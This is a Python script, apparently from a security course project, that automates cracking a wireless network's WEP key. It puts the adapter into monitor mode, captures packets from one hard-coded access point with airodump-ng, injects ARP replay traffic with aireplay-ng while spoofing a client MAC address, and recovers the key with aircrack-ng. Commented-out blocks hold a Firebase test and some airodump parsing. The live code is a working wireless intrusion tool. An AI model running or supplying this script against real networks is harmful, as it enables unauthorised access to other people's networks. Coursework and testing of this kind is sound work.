import os
import subprocess
import time
import pandas as pd
import commands
from firebase import firebase
import threading
from wifi import Cell
import signal




"""
cell = Cell.all('wlan0')
for x in xrange(0,len(cell)):
	print('essid: '+str(cell[x].ssid))
	print('channel: '+str(cell[x].channel))
	print('bssid: '+str(cell[x].address))
	print('enc: '+str(cell[x].encryption_type))
"""
wlan = commands.getoutput('sudo airmon-ng check kill')
wlan = commands.getoutput('sudo airmon-ng start wlan0 4')
airodump = subprocess.Popen(['sudo','airodump-ng','--bssid','C0:25:E9:7C:5A:E0','--channel','4','--write','./datos/Seguridad2019-2/seguridad2019','wlan0mon'],shell=False,preexec_fn=os.setsid)
time.sleep(30)
auxEncontrado = True
dt = None
while auxEncontrado:
	dt = pd.read_csv('./datos/Seguridad2019-2/seguridad2019-01.csv')
	if dt.size >= 3:
		auxEncontrado = False
print(dt.get_values()[2][0])
airodump1 = subprocess.Popen(['sudo','aireplay-ng','-3','-b','C0:25:E9:7C:5A:E0','-h','C4:06:83:C9:E7:3C','wlan0mon'],shell=False,preexec_fn=os.setsid)
time.sleep(60)
result = commands.getoutput('sudo aircrack-ng ./datos/Seguridad2019-2/seguridad2019-*.cap')
os.killpg(os.getpgid(airodump.pid),signal.SIGTERM)
os.killpg(os.getpgid(airodump1.pid),signal.SIGTERM)
result = str(result)
print(result)
result = result.split("\n")
print(result[0])
print(result[len(result)-1])

#airodump.terminate()
#airodump.kill()
wlan = commands.getoutput('sudo airmon-ng stop wlan0mon')
wlan = commands.getoutput('sudo ifconfig wlan0 up')
"""
airodump = subprocess.Popen(['sudo','airodump-ng','wlan0mon','--write','./temp/redes.txt'])
time.sleep(30)
airodump.kill()
wlan = subprocess.Popen(['sudo','airmon-ng','stop','wlan0mon'])
wlan = subprocess.Popen(['sudo','ifconfig','wlan0','up'])
"""
"""
def obtenerTipo():
	result = commands.getoutput('airodump-ng wlan0mon --write ./temp/redes.txt')

tipo = threading.Thread(target=obtenerTipo)
tipo.start()
time.sleep(20)


firebase = firebase.FirebaseApplication("https://redes-wireless.firebaseio.com/",None)
data = {
	'name':'cesar',
	'edad':28
}
result = firebase.post('/redes-wireless/Redes',data)#para agregar
result = firebase.get('/redes-wireless/Redes','')#obtiene todos las entradas
result = firebase.put('/redes-wireless/Redes/-M2onqkq8z0DwCWDXBFS','name','augusto')
print(result)

dt = pd.read_csv('./prueba/datos-01.csv',encoding='utf-8')
datos = dt.get_values()
print(datos[0][5])

proc = subprocess.Popen(['airodump-ng','wlan0mon'], stdout=subprocess.PIPE,)
stdout_value = proc.communicate()[0].decode('utf-8')
time.sleep(10)
proc.kill()
print('stdout: ',repr(stdout_value))
"""